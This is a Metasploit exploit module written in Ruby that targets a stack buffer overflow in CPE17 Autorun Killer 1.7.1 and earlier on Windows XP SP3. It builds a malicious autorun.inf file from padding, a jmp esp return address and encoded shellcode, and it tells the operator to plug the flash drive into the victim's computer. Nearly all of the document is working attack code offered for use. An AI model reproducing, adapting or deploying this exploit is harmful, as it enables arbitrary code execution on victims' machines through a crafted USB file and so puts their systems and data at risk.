# CPE17 Autorun Killer <= 1.7.1 Stack Buffer Overflow exploit
# by Xelenonz
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
      include Msf::Exploit::FILEFORMAT
 
      def initialize(info = {})
                super(update_info(info,
                        &#039;Name&#039;           => &#039;CPE17 Autorun Killer <= 1.7.1 Stack Buffer Overflow exploit&#039;,
                        &#039;Description&#039;    => %q{
                                        readfile function is vulnerable it can be overflow 
                                             },
                        &#039;Author&#039;         => [ &#039;Xelenonz&#039; ],
                        &#039;Version&#039;        => &#039;0.1&#039;,
                         
                        &#039;Payload&#039;        =>
                                {
                                        &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumMixed,
                                        &#039;EncoderOptions&#039; => {&#039;BufferRegister&#039;=>&#039;ECX&#039;},
                                },
            &#039;DefaultOptions&#039; =>
                                {
                                &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                                },
                        &#039;Platform&#039;       => &#039;windows&#039;,
 
                        &#039;Targets&#039;        =>
                                [
                                        [
                                            &#039;Windows XP SP3&#039;,
                                                {   &#039;Ret&#039; => 0x775a676f,
                                                    &#039;Offset&#039; => 500
                                                }
                                       ],
                                       
                                ],
                        &#039;DefaultTarget&#039; => 0,
 
                        &#039;Privileged&#039;     => false
                        ))
 
                        register_options(
                        [
                            OptString.new(&#039;FILENAME&#039;,   [ true, &#039;The file name.&#039;,  &#039;autorun.inf&#039;]),
                        ], self.class)
       end
 
       def exploit
          print_status("Encoding Payload ...")
          enc = framework.encoders.create("x86/alpha_mixed")
          enc.datastore.import_options_from_hash( {&#039;BufferRegister&#039;=>&#039;ESP&#039;} )
          hunter = enc.encode(payload.encoded, nil, nil, platform)
          buffer = ""
          buffer << "A"*target[&#039;Offset&#039;] # padding offset
          buffer << [target.ret].pack(&#039;V&#039;) # jmp esp
          buffer << hunter # shellcode
          print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
          file_create(buffer)
          print_status("Plug flashdrive to victim&#039;s computer")
          handler
           
       end
end



